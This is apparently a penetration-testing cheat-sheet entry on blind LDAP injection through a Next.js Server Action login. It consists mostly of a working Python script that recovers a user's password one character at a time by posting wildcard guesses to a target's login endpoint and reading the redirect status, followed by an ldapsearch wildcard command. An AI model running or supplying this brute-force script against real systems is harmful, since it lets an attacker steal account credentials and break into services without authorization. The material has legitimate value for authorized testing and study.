# LDAP Blind Injection via Next.js Server Action

When a Next.js app uses Server Actions for authentication and passes user input directly to an LDAP bind/search without sanitization, LDAP wildcards (`*`) can be used to brute-force passwords character by character.

**Fingerprint:** login with `*` as password → succeeds → LDAP injection confirmed.

```python
# Blind LDAP password brute (Next.js multipart Server Action form):
import requests, string, sys

headers = {"Next-Action": "<ACTION_HASH>"}  # from browser devtools on the login request
username = sys.argv[1]
password = ""
while True:
    for c in string.printable[:-5]:
        files = {
            "1_ldap-username": (None, username),
            "1_ldap-secret": (None, f"{password}{c}*"),
            "0": (None, '[{},"$K1"]'),
        }
        resp = requests.post("http://<TARGET>/login", headers=headers, files=files)
        if resp.status_code == 303:   # redirect = success
            password += c
            print(f"\rFound so far: {password}", end="")
            break
    else:
        print(f"\nPassword: {password}")
        break
```

The `Next-Action` hash is found in the login POST request headers (browser DevTools → Network → request headers). Different for each Next.js build.

For traditional LDAP injections (non-Next.js), use LDAP-specific tools:
```bash
ldapsearch -x -H ldap://<TARGET> -D "<USER>" -w '<PASS>*' -b "dc=<domain>,dc=<tld>"
```
